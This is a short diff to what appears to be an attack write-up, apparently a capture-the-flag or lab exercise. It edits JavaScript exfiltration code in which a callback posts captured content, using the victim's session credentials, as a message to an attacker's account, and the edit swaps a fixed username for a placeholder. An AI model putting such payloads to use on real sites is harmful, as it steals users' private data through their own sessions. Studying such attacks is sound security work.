@@ -126,7 +126,7 @@ The callback is a self-invoking function that performs the entire exfiltration c
         method: 'POST',
         credentials: 'same-origin',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: 'to_username=attacker123&content=' + encodeURIComponent(content)
+        body: 'to_username={your_username}&content=' + encodeURIComponent(content)
       });
     });
   return function() {};
